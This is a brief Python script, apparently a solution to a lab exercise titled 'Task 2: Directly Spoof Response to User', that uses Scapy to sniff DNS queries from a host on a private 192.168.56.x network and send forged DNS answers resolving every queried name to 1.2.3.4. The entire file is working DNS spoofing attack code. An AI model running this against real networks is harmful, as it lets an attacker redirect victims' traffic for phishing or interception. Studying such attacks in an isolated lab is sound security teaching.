"""
Task 2: Directly Spoof Response to User
"""

from scapy.all import *
import time

sniff(
    filter="udp port 53 and ip src 192.168.56.102",
    prn=lambda p:
        send(
            IP(dst=p[IP].src, src=p[IP].dst)\
            /UDP(dport=p[UDP].sport, sport=p[UDP].dport)\
            /DNS(id=p[DNS].id, an=DNSRR(rrname=p[DNSQR].qname, rdata="1.2.3.4"))
        ))
